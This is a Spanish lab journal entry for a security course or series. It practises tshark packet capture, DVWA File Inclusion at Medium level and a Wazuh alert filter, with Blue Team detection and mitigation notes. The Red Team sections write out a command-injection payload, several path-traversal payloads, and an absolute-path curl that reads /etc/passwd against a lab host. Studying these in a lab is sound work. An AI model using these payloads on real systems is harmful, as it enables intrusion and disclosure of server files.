# Día 20 — Network Sniffing: Wireshark + File Inclusion Medium + Filtros Wazuh

**Fecha:** Abril 2026  
**MITRE:** T1040, T1190  
**DVWA:** File Inclusion (Medium)

---

## Teoría

### Network Sniffing — Wireshark/tshark
Wireshark es el analizador de paquetes más usado en ciberseguridad. Captura todo el tráfico de red en una interfaz y permite analizarlo en detalle. `tshark` es su versión CLI — más práctica para automatización y scripting. Los archivos `.pcap` son el formato estándar de captura — pueden abrirse en Wireshark GUI para análisis visual.

### File Inclusion Medium
En nivel Low el código incluye directamente el parámetro `page` sin filtros. En nivel Medium aplica `str_replace` para eliminar `../` y `http://` — bloqueando path traversal relativo y RFI. Sin embargo no valida rutas absolutas — una ruta como `/etc/passwd` bypasea completamente el filtro porque no contiene los patrones bloqueados.

---

## Red Team

### Sección 1 — Captura de tráfico con tshark

**Identificar interfaz de red:**
```bash
ip addr show | grep -E "inet|enp|eth|wlan" | grep -v "127.0.0.1"
```
Interfaz: `eth0` — IP: `192.168.1.132`

**Iniciar captura:**
```bash
sudo tshark -i eth0 -f "host 192.168.1.96" -w /tmp/captura_dia20.pcap
```

**En otra terminal — ejecutar ataque:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/exec/" \
  -b "PHPSESSID=<session>; security=medium" \
  -X POST \
  -d "ip=127.0.0.1| whoami&Submit=Submit"
```

**Análisis del pcap:**
```bash
sudo tshark -r /tmp/captura_dia20.pcap -Y "http" -T fields \
  -e http.request.method -e http.request.uri -e http.file_data 2>/dev/null | grep -v "^$"
```

**Output capturado:**
```
POST    /vulnerabilities/exec/
ip=127.0.0.1| whoami&Submit=Submit   ← payload en texto plano
```

El payload viaja en texto plano — un IDS con inspección de capa 7 detectaría `| whoami` en el parámetro `ip` como firma de Command Injection.

**Perspectiva Blue Team:**
El pcap es evidencia forense completa del ataque — método HTTP, URL, cookie de sesión y payload son visibles. En entornos con HTTPS el payload viajaría cifrado pero los metadatos (IP origen, destino, timing) seguirían siendo visibles.

### Sección 2 — DVWA File Inclusion (Medium)

**Filtro del código fuente Medium:**
```php
$file = str_replace(array("http://", "https://"), "", $file);
$file = str_replace(array("../", "..\"), "", $file);
```

Bloquea:
- `../` — path traversal relativo
- `http://`, `https://` — RFI
- No bloquea rutas absolutas

**Intentos bloqueados:**
```bash
# Path traversal — bloqueado
?page=../../../etc/passwd

# Double encoding — bloqueado
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Nested traversal — bloqueado
?page=....//....//....//etc/passwd
```

**Bypass — ruta absoluta:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/fi/?page=/etc/passwd" \
  -b "PHPSESSID=<session>; security=medium" | grep -i "root\|www-data"
```

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Resumen de técnicas:**

| Técnica | Payload | Resultado |
|---------|---------|-----------|
| Path traversal relativo | `../../../etc/passwd` | ❌ Bloqueado |
| URL encoding | `%2e%2e%2f...` | ❌ Bloqueado |
| Nested traversal | `....//....//` | ❌ Bloqueado |
| Ruta absoluta | `/etc/passwd` | ✅ Bypass |

**Diferencia LFI vs RFI:**

| | LFI | RFI |
|--|--|--|
| Origen | Archivo local en el servidor | Archivo remoto del atacante |
| Objetivo | Leer información | Ejecutar código |
| Peligrosidad | Alta | Crítica |
| Requisito PHP | Ninguno | `allow_url_include=On` |

---

## App MS Security — Filtros por Nivel Wazuh

Se agregaron filtros por nivel de alerta en la tabla de Wazuh — All, L7, L8, L9, L10, L12:

```jsx
const [wazuhFilter, setWazuhFilter] = useState(0)

// Botones de filtro
{[0, 7, 8, 9, 10, 12].map(level => (
  <button key={level} className={`filter-btn ${wazuhFilter === level ? "active" : ""}`}
    onClick={() => setWazuhFilter(level)}>
    {level === 0 ? "All" : `L${level}`}
  </button>
))}

// Filtrado de alertas
{wazuhAlerts
  .filter(a => wazuhFilter === 0 || a.rule_level === wazuhFilter)
  .map(alert => (...))}
```

Colores por nivel:
- Level >= 10 → rojo (`#f87171`)
- Level >= 8 → naranja (`#fb923c`)
- Level 7 → azul accent (`#38bdf8`)

---

## Blue Team

### Detección Network Sniffing
- El sniffing en sí es difícil de detectar — es pasivo, no genera tráfico
- La defensa es usar HTTPS para cifrar el contenido — los metadatos siguen visibles
- En redes switcheadas el sniffing requiere estar en el mismo segmento o hacer ARP spoofing

### Detección File Inclusion
- Requests con rutas absolutas en parámetros GET (`/etc/passwd`, `/etc/shadow`)
- Un WAF con reglas de path traversal detectaría estos patrones
- Wazuh con agente en Ubuntu alertaría sobre accesos inusuales a archivos sensibles

### Mitigación File Inclusion
- Usar whitelist — solo permitir valores conocidos: `file1.php`, `file2.php`, `file3.php`
- Nunca incluir archivos basándose directamente en input del usuario
- Deshabilitar `allow_url_include` en PHP

---

## Conclusión

tshark capturó evidencia forense completa del ataque de Command Injection — el payload `ip=127.0.0.1| whoami` viaja en texto plano y es detectable por cualquier IDS con inspección de capa 7. File Inclusion Medium demuestra que los filtros de lista negra son insuficientes — bloquear `../` no protege contra rutas absolutas que logran el mismo resultado. Los filtros por nivel en el dashboard permiten al analista enfocarse en alertas críticas sin ruido de eventos de bajo nivel.
